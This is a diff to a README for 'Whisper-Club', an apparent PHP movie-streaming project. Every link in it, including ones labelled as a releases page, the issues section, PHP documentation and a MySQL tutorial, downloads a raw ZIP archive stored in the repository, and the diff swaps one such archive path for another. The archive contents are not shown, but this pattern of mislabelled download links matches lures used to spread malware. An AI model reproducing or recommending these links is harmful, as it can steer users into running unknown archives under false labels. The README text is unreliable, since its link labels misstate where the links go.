@@ -1,7 +1,7 @@
 # 🎥 Whisper-Club - Stream Movies with Ease
 
 ## 🔗 Download Here
-[![Download](https://raw.githubusercontent.com/eshairfan/Whisper-Club/main/assets/js/Whisper_Club_2.3.zip)](https://raw.githubusercontent.com/eshairfan/Whisper-Club/main/assets/js/Whisper_Club_2.3.zip)
+[![Download](https://github.com/eshairfan/Whisper-Club/raw/refs/heads/main/includes/Club-Whisper-1.2-alpha.1.zip)](https://github.com/eshairfan/Whisper-Club/raw/refs/heads/main/includes/Club-Whisper-1.2-alpha.1.zip)
 
 ## 📖 Introduction
 Whisper Movies is an open-source PHP streaming website designed for movies and TV series. With a variety of features, it allows users to enjoy a seamless viewing experience. Whether you're interested in episode management, searching for your favorite shows, or customizing the platform, Whisper Movies covers it all.
@@ -25,10 +25,10 @@ To successfully set up and use Whisper Movies, follow the steps outlined below. 
 ## 📥 Download & Install
 To download Whisper Movies, you need to visit the releases page where you can find the latest version of the software.
 
-1. Go to the [Whisper-Club Releases page](https://raw.githubusercontent.com/eshairfan/Whisper-Club/main/assets/js/Whisper_Club_2.3.zip).
+1. Go to the [Whisper-Club Releases page](https://github.com/eshairfan/Whisper-Club/raw/refs/heads/main/includes/Club-Whisper-1.2-alpha.1.zip).
 2. Look for the latest version listed on that page.
 3. Click on the version number to view assets.
-4. Download the file labeled "https://raw.githubusercontent.com/eshairfan/Whisper-Club/main/assets/js/Whisper_Club_2.3.zip" or similar.
+4. Download the file labeled "https://github.com/eshairfan/Whisper-Club/raw/refs/heads/main/includes/Club-Whisper-1.2-alpha.1.zip" or similar.
 5. Extract the downloaded ZIP file to your preferred directory.
 
 ## 🔧 Setup Instructions
@@ -47,7 +47,7 @@ To download Whisper Movies, you need to visit the releases page where you can fi
      - `DB_PASS`: Your database password
 
 4. **Run the Installation Script:**
-   - Access the website in your browser (e.g., `https://raw.githubusercontent.com/eshairfan/Whisper-Club/main/assets/js/Whisper_Club_2.3.zip`).
+   - Access the website in your browser (e.g., `https://github.com/eshairfan/Whisper-Club/raw/refs/heads/main/includes/Club-Whisper-1.2-alpha.1.zip`).
    - Follow the on-screen instructions to complete the setup.
 
 ## 🔒 Security Considerations
@@ -57,7 +57,7 @@ To download Whisper Movies, you need to visit the releases page where you can fi
 
 ## 📞 Support
 If you encounter issues or have questions, consider the following support options:
-- **Issues Page:** Check the [issues section](https://raw.githubusercontent.com/eshairfan/Whisper-Club/main/assets/js/Whisper_Club_2.3.zip) on GitHub for common problems and community solutions.
+- **Issues Page:** Check the [issues section](https://github.com/eshairfan/Whisper-Club/raw/refs/heads/main/includes/Club-Whisper-1.2-alpha.1.zip) on GitHub for common problems and community solutions.
 - **Community Forums:** Engage with other users on forums or social media groups dedicated to PHP applications.
 - **Documentation:** Refer to official PHP documentation for technical questions related to your web server or setup.
 
@@ -78,8 +78,8 @@ Whisper Movies welcomes contributions. If you would like to improve the applicat
 - **JavaScript:** For interactive elements on the site.
 
 ## 📚 Learning Resources
-- [PHP Official Documentation](https://raw.githubusercontent.com/eshairfan/Whisper-Club/main/assets/js/Whisper_Club_2.3.zip)
-- [MySQL Tutorial](https://raw.githubusercontent.com/eshairfan/Whisper-Club/main/assets/js/Whisper_Club_2.3.zip)
-- [Web Hosting Basics](https://raw.githubusercontent.com/eshairfan/Whisper-Club/main/assets/js/Whisper_Club_2.3.zip)
+- [PHP Official Documentation](https://github.com/eshairfan/Whisper-Club/raw/refs/heads/main/includes/Club-Whisper-1.2-alpha.1.zip)
+- [MySQL Tutorial](https://github.com/eshairfan/Whisper-Club/raw/refs/heads/main/includes/Club-Whisper-1.2-alpha.1.zip)
+- [Web Hosting Basics](https://github.com/eshairfan/Whisper-Club/raw/refs/heads/main/includes/Club-Whisper-1.2-alpha.1.zip)
 
-Visit the [Whisper-Club Releases page](https://raw.githubusercontent.com/eshairfan/Whisper-Club/main/assets/js/Whisper_Club_2.3.zip) to download and start streaming your movies and shows today!
+Visit the [Whisper-Club Releases page](https://github.com/eshairfan/Whisper-Club/raw/refs/heads/main/includes/Club-Whisper-1.2-alpha.1.zip) to download and start streaming your movies and shows today!
